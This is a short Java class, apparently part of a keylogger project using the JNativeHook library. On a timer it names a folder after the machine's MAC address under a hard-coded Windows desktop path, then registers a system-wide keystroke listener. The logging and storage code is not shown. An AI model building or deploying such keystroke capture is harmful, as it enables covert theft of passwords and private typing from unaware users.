package jnativehookexample;

import java.io.File;
import java.util.TimerTask;
import org.jnativehook.GlobalScreen;

public class RunKL extends TimerTask{

    @Override
    public void run() {
        MACaddress mac=new MACaddress();
        String s = mac.getmac();
        File dir = new File("C:\\Users\\PanTomek\\Desktop\\ThisOneFile\\" + s);
        dir.mkdir();
        KeyListener keyListener = new KeyListener();
        GlobalScreen.addNativeKeyListener(keyListener);
    }
    
}
